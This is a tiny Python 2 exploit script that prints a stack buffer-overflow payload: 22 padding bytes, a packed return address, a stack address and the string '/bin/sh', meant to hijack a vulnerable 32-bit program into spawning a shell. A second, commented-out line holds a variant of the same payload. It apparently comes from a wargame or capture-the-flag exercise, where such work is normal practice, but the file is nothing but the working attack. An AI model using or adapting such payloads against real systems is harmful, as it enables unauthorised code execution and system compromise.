from struct import pack

print "\xaa"*22 + pack("<I",0x08048eed) + pack("<I", 0xbffe8f14) + "/bin/sh"

#print "\xff"*22 + pack("<I",0x08048eed)  + "/bin/sh"
